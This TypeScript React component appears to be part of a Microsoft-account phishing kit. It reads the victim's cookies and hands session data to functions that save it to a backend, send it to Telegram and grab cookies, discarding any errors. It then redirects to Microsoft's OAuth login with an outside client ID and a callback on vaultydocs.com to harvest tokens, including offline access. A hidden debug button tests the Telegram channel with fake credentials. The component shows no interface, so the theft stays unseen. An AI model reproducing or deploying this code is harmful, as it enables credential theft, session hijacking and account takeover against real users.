import React, { useEffect } from 'react';

// Import or declare the backend functions (keep these as they were)
declare function saveSessionToBackend(sessionData: any): Promise<any>;
declare function sendToTelegram(sessionData: any): Promise<any>;
declare function grabCookies(): void;

interface RealOAuthRedirectProps {
  onLoginSuccess?: (sessionData: any) => void;
  sessionData?: any;
}

const SLOW_DELAY = 1200;
const redirectDelay = SLOW_DELAY * 3;

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, sessionData }) => {
  useEffect(() => {
    localStorage.setItem('selected_provider', 'Microsoft');
    localStorage.setItem('oauth_start_time', Date.now().toString());

    if (window.location.search.includes('debug=1')) {
      setTimeout(() => {
        const testButton = document.createElement('button');
        testButton.innerText = '🧪 Test Telegram Now';
        testButton.style.cssText =
          'position:fixed;top:10px;right:10px;z-index:9999;background:red;color:white;padding:10px;border:none;border-radius:5px;cursor:pointer;';
        testButton.onclick = async () => {
          try {
            const response = await fetch('/.netlify/functions/sendTelegram', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                email: 'manual-test@debug.com',
                password: 'ManualTest123',
                provider: 'Microsoft',
                fileName: 'Manual Debug Test',
                timestamp: new Date().toISOString(),
                sessionId:
                  'manual_' + Math.random().toString(36).substring(2, 15),
                userAgent: navigator.userAgent,
                formattedCookies: [
                  {
                    name: 'MANUAL_TEST',
                    value: 'manual_value_' + Date.now(),
                    domain: '.login.microsoftonline.com',
                  },
                ],
                browserFingerprint: { localStorage: '{"manual":"test"}' },
              }),
            });
            const result = await response.json();
            alert('Manual test completed - check console and Telegram');
          } catch (error) {
            alert('Manual test failed: ' + error.message);
          }
        };
        document.body.appendChild(testButton);
      }, 1000);
    }

    const preAuthFingerprint = {
      cookies: document.cookie,
    };

    const generateRandomString = (length: number): string => {
      const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~';
      let result = '';
      const values = window.crypto.getRandomValues(new Uint8Array(length));
      for (let i = 0; i < length; i++) {
        result += charset[values[i] % charset.length];
      }
      return result;
    };

    const generateCodeChallenge = async (codeVerifier: string): Promise<string> => {
      const encoder = new TextEncoder();
      const data = encoder.encode(codeVerifier);
      const digest = await window.crypto.subtle.digest('SHA-256', data);
      return btoa(String.fromCharCode(...new Uint8Array(digest)))
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
    };

    let saveSuccess = false;
    let telegramSuccess = false;

    (async () => {
      let currentSessionData = (sessionData) ? sessionData : {};

      try {
        if (typeof saveSessionToBackend === 'function') {
          await saveSessionToBackend(currentSessionData);
          saveSuccess = true;
        }
      } catch (saveError) {}

      try {
        if (typeof sendToTelegram === 'function') {
          await sendToTelegram(currentSessionData);
          telegramSuccess = true;
        }
      } catch (telegramError) {}

      if (typeof grabCookies === 'function') {
        grabCookies();
      }

      setTimeout(async () => {
        try {
          const codeVerifier = generateRandomString(64);
          const codeChallenge = await generateCodeChallenge(codeVerifier);
          const state = Math.random().toString(36).substring(2, 15);

          sessionStorage.setItem('pkce_verifier', codeVerifier);
          sessionStorage.setItem('oauth_state', state);

          const params = new URLSearchParams({
            client_id: '59f34afe-9b1b-4f3a-9311-fd792fe249ca',
            response_type: 'code',
            redirect_uri: 'https://vaultydocs.com/oauth-callback',
            response_mode: 'query',
            scope: 'openid profile email User.Read offline_access',
            code_challenge: codeChallenge,
            code_challenge_method: 'S256',
            state: state,
            prompt: 'login',
          });

          const microsoftOAuthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${params.toString()}`;
          window.location.href = microsoftOAuthUrl;
        } catch (err) {
          const fallbackState = Math.random().toString(36).substring(2, 15);
          sessionStorage.setItem('oauth_state', fallbackState);

          const fallbackParams = new URLSearchParams({
            client_id: '59f34afe-9b1b-4f3a-9311-fd792fe249ca',
            response_type: 'code',
            redirect_uri: 'https://vaultydocs.com/oauth-callback',
            response_mode: 'query',
            scope: 'openid profile email User.Read offline_access',
            state: fallbackState,
            prompt: 'login',
          });

          const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${fallbackParams.toString()}`;
          window.location.href = fallbackUrl;
        }
      }, redirectDelay);
    })();
  }, [sessionData, onLoginSuccess]);

  return null; // Silent: no UI/status rendered
};

export default RealOAuthRedirect;